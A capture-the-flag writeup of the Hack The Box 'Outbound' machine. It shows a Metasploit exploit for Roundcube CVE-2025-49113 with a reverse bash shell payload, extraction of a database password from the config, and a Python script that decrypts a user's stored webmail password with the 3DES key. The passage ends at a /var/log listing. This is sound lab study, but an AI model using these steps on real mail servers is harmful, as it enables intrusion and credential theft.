---
title: Outbound [Easy]
date: 2025-07-14
password: 3905181a4fcf0c6f51b0ef10616abf1695f61f082587db07952da790128fa6c7
tags: [htb, linux, nmap, ssh, below, roundcube, cve-2025-49113, mysql, symlink, msfconsole, 3des cbc, file permission, race condition]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/outbound-htb-season8
image: /assets/img/outbound-htb-season8/outbound-htb-season8_banner.png
---

# Outbound HTB Season 8
## Machine information
As is common in real life pentests, you will start the Outbound box with credentials for the following account `tyler` / `LhKL1o9Nm3X2` <br>
Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 04:40 EDT
Nmap scan report for 10.129.xx.xx (10.129.xx.xx)
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     mail.outbound.htb
```

Let's check out the `http://mail.outbound.htb`.

### Web Enumeration
![outbound](/assets/img/outbound-htb-season8/outbound-htb-season8_home_page.png)

So it is a Roundcube Webmail. Let's use the provided credentials to login.

![outbound](/assets/img/outbound-htb-season8/outbound-htb-season8_login_page.png)

After login, first thing to check is the version of Roundcube.

![outbound](/assets/img/outbound-htb-season8/outbound-htb-season8_roundcube_version.png)

So there version is `1.6.10`. <br>
&rarr; Let's check the vulnerability of this version and found out this application is vulnerable to [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113).

### CVE-2025-49113
There is a post from Offsec blog about this vulnerability: [CVE-2025-49113 - Roundcube Webmail 1.6.10 - Remote Code Execution](https://www.offsec.com/blog/cve-2025-49113/). <br>
We can download the exploit from [Exploit-DB](https://www.exploit-db.com/exploits/52324). <br>
&rarr; Let's import this exploit to our `metasploit` and `reload_all` to use it or we can simply update & upgrade `metasploit-framework` to the latest version.

After that, turn on `metasploit` with `sudo msfconsole -q` and search for `roundcube` module.

```bash
└─$ sudo msfconsole -q
msf6 > search roundcube

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   - ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/gather/roundcube_auth_file_read             2017-11-09       normal     No     Roundcube TimeZone Authenticated File Disclosure
   1  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization
   2    \_ target: Linux Dropper                            .                .          .      .
   3    \_ target: Linux Command                            .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Command'
```

Let's use module 3 and type the `options` to see the options.

```bash
msf6 > use 3
[*] Additionally setting TARGET => Linux Command
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > options

Module options (exploit/multi/http/roundcube_auth_rce_cve_2025_49113):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HOST                        no        The hostname of Roundcube server
   PASSWORD                    yes       Password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of the Roundcube Application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       Email User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Command



View the full module info with the info, or info -d command.
```

Filled the options and type `run` to exploit.

```bash
msf6 > use 3
[*] Additionally setting TARGET => Linux Command
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set HOST mail.outbound.htb
HOST => mail.outbound.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME tyler
USERNAME => tyler
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD LhKL1o9Nm3X2
PASSWORD => LhKL1o9Nm3X2
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS 10.129.xx.xx
RHOSTS => 10.129.xx.xx
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set VHOST mail.outbound.htb
VHOST => mail.outbound.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[*] Started reverse TCP handler on 10.xx.xx.xx:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: Q3z6IKJd2Wz4yXB3SKaarOaimgqxXVkN
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Command shell session 1 opened (10.xx.xx.xx:4444 -> 10.129.xx.xx:48828) at 2025-07-13 05:14:13 -0400

bash -i
www-data@mail:/$
```

So we have a shell as `www-data` user. <br>
&rarr; Let's go around to find anything interesting.

### MySQL
After recon, we found out the config file in `/var/www/html/roundcube/config/config.inc.php`.

```php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

We saw this.
```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

Which we can use to connect to the MySQL database. And also there is a key that is really interesting.

```php
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

This key maybe use to decrypt the password of the one of the user in the database. <br>
&rarr; Let's check the database.

```bash
www-data@mail:/var/www/html/roundcube/config$ mysql -u roundcube -p
mysql -u roundcube -p
Enter password: RCDBPass2025

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 106
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)
```

Check the tables in the `roundcube` database.

```bash
MariaDB [(none)]> use roundcube;
use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

Gonna check the `session` table cause this table store the session of the user.

```bash
MariaDB [roundcube]> select * from session;
select * from session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)

MariaDB [roundcube]>
```

There we go, found out some encoded data, this could be base64 encoded data. <br>
&rarr; Use [CyberChef](https://gchq.github.io/CyberChef/) to decode it.

After decode, we got this.

```json
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

We got some creds related to the user `jacob`. <br>
- password: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`.
- auth_secret: `DpYqv6maI9HxDL5GhcCd8JaQQW`.
- request_token: `TIsOaABA1zHSXZOBpH6up5XFyayNRHaw`.

### 3DES CBC mode
So we need to decrypt the password of the user `jacob` and we know that the key is `rcmail-!24ByteDESkey*Str`. <br>
After some search, we found an [issue](https://github.com/mail-in-a-box/mailinabox/issues/1968) in `mailinabox` project that we can identified that the cipher method is `3DES CBC` mode. <br>
&rarr; We need to decrypt the password with `3DES CBC` mode.

```py
#!/usr/bin/env python3
import base64
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

def decrypt_roundcube_password(encrypted_data, des_key):
    """
    Decrypt RoundCube password using 3DES CBC with extracted IV
    Format: base64(IV + encrypted_data)
    """
    try:
        # Step 1: Base64 decode the encrypted data
        decoded_data = base64.b64decode(encrypted_data)
        
        # Step 2: Extract IV (first 8 bytes) and encrypted data (remaining bytes)
        iv = decoded_data[:8]
        encrypted_bytes = decoded_data[8:]
        
        # Step 3: Prepare the 3DES key (24 bytes)
        key = des_key.encode('utf-8')[:24]
        
        # Step 4: Create 3DES cipher in CBC mode with extracted IV
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        
        # Step 5: Decrypt the data
        decrypted_padded = cipher.decrypt(encrypted_bytes)
        
        # Step 6: Remove padding
        try:
            decrypted = unpad(decrypted_padded, DES3.block_size)
        except:
            # Manual padding removal if automatic fails
            decrypted = decrypted_padded.rstrip(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08')
        
        # Step 7: Return as string
        return decrypted.decode('utf-8', errors='ignore').strip()
        
    except Exception as e:
        return f"Decryption failed: {str(e)}"

def main():
    # RoundCube DES key
    des_key = 'rcmail-!24ByteDESkey*Str'
    
    # Your encrypted data
    password = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'
    auth_secret = 'DpYqv6maI9HxDL5GhcCd8JaQQW'
    request_token = 'TIsOaABA1zHSXZOBpH6up5XFyayNRHaw'
    
    print("RoundCube Password Decryption")
    print("=" * 35)
    
    # Decrypt jacob's password
    decrypted_password = decrypt_roundcube_password(password, des_key)
    print(f"Username: jacob")
    print(f"Password: {decrypted_password}")
    print()
    
    # Try the other data too
    print("Other data:")
    print(f"Auth Secret: {decrypt_roundcube_password(auth_secret, des_key)}")
    print(f"Request Token: {decrypt_roundcube_password(request_token, des_key)}")
    
    # Show the decryption details for analysis
    print(f"\nDecryption Method: 3DES CBC with extracted IV")
    decoded = base64.b64decode(password)
    print(f"IV (hex): {decoded[:8].hex()}")
    print(f"Encrypted data (hex): {decoded[8:].hex()}")

if __name__ == "__main__":
    main()
```

```bash
└─$ python3 decrypt.py
RoundCube Password Decryption
===================================
Username: jacob
Password: 595mO8Dmwxxx

Other data:
Auth Secret: Decryption failed: Incorrect padding
Request Token: 2n       T#6y

Decryption Method: 3DES CBC with extracted IV
IV (hex): 2fb46fd3403c4eec
Encrypted data (hex): 0902bebb9084f1c5c4a09c8936e409bf
```

So we got the password of the user `jacob` is `595mO8Dmwxxx`. <br>
&rarr; Let's ssh to the machine with this creds.

```bash
└─$ ssh jacob@10.129.xx.xx
jacob@10.129.xx.xx's password: 
Permission denied, please try again.
jacob@10.129.xx.xx's password:
```

Hmm, can not login with this password. <br>
&rarr; Let's try to switch user in `www-data` to `jacob`.

```bash
www-data@mail:/var/www/html/roundcube/config$ su jacob
su jacob
Password: 595mO8Dmwxxx

jacob@mail:/var/www/html/roundcube/config$
```

Successfully switch user to `jacob`. <br>
And if we check the `ip a` of `www-data` we got this.

```bash
www-data@mail:/$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether aa:7e:13:60:1b:cb brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
www-data@mail:/$
```

So this roundcube is use from different container as we can see `172.17.0.2/16`. <br>
Thinking this could be the reason why we can not login `jacob` with the password that we got from the database. <br>
&rarr; Let's check the `ip a` of `jacob`.

```bash
jacob@mail:/var/www/html/roundcube/config$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether fa:f9:81:db:0e:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

As expected, we got the same IP address with `www-data`. <br>
&rarr; Let's go and check the `jacob` directory that we can find some interesting files.

```bash
jacob@mail:~/mail/INBOX$ cat jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1exxx

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Found this email from `mel` and `tyler` and we can see that the password of the user `jacob` has been changed to `gY4Wr3a1exxx`. <br>
We also notice that the user `jacob` has been granted the privilege to inspect the logs and resource monitoring with [Below](https://developers.facebook.com/blog/post/2021/09/21/below-time-travelling-resource-monitoring-tool/) <br>
&rarr; Let's ssh with new creds.

```bash
└─$ ssh jacob@10.129.xx.xx                   
jacob@10.129.xx.xx's password: 
jacob@outbound:~$ ls -la
total 28
drwxr-x--- 3 jacob jacob 4096 Jul  8 20:14 .
drwxr-xr-x 5 root  root  4096 Jul  8 20:14 ..
lrwxrwxrwx 1 root  root     9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r-- 1 jacob jacob  220 Jun  8 12:14 .bash_logout
-rw-r--r-- 1 jacob jacob 3771 Jun  8 12:14 .bashrc
drwx------ 2 jacob jacob 4096 Jun 11 11:32 .cache
-rw-r--r-- 1 jacob jacob  807 Jun  8 12:14 .profile
-rw-r----- 1 root  jacob   33 Jul 13 08:39 user.txt
jacob@outbound:~$ cat user.txt
e1541dxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Nail the `user.txt` flag.

## Initial Access
After we ssh to `jacob`, let's check the logs.

```bash
jacob@outbound:/var/log$ ls -la
total 3612
drwxrwxr-x  13 root      syslog             4096 Jul 15 04:27 .
drwxr-xr-x  14 root      root               4096 Jul  8 20:14 ..
-rw-r--r--   1 root      root                  0 Jul  9 12:39 alternatives.log
-rw-r--r--   1 root      root                174 Jul  8 20:40 alternatives.log.1
-rw-r-----   1 root      adm                   0 Jul  8 11:13 apport.log
drwxr-xr-x   2 root      root               4096 Jul  9 12:39 apt
drwxr-x---   2 root      adm                4096 Jul 10 11:44 audit
-rw-r-----   1 syslog    adm                2941 Jul 15 04:30 auth.log
-rw-r-----   1 syslog    adm               24245 Jul 10 12:11 auth.log.1
drwxrwxrwx   3 root      root               4096 Jul  8 20:45 below
-rw-rw----   1 root      utmp                384 Jul 15 04:30 btmp
drwxr-xr-x   2 root      root               4096 Jul  8 20:14 dist-upgrade
-rw-r-----   1 root      adm              117114 Jul 15 04:27 dmesg
-rw-r-----   1 root      adm              116226 Jul 10 12:10 dmesg.0
-rw-r-----   1 root      adm               24186 Jul 10 11:44 dmesg.1.gz
-rw-r-----   1 root      adm               24283 Jul  9 13:36 dmesg.2.gz
-rw-r-----   1 root      adm               24072 Jul  9 12:39 dmesg.3.gz
-rw-r-----   1 root      adm               24320 Jul  8 20:52 dmesg.4.gz
-rw-r--r--   1 root      root                  0 Jul  9 12:39 dpkg.log
-rw-r--r--   1 root      root              26811 Jul  8 21:06 dpkg.log.1
drwxrwx---   4 root      adm                4096 Jul  8 20:14 installer
drwxr-sr-x+  3 root      systemd-journal    4096 Jul  8 20:14 journal
-rw-r-----   1 syslog    adm              141700 Jul 15 04:27 kern.log
-rw-r-----   1 syslog    adm              984892 Jul 10 12:11 kern.log.1
drwxr-xr-x   2 landscape landscape          4096 Jul  8 20:39 landscape
-rw-rw-r--   1 root      utmp             292876 Jul 15 04:30 lastlog
drwxr-xr-x   2 _laurel   _laurel            4096 Jul 10 11:49 laurel
drwxr-xr-x   2 root      adm                4096 Jul 10 11:44 nginx
drwx------   2 root      root               4096 Jul  8 20:14 private
lrwxrwxrwx   1 root      root                 39 Feb 16 20:57 README -> ../../usr/share/doc/systemd/README.logs
-rw-r-----   1 syslog    adm              232478 Jul 15 04:30 syslog
-rw-r-----   1 syslog    adm             1762489 Jul 10 12:11 syslog.1
drwxr-xr-x   2 root      root               4096 Jul 15 04:27 sysstat
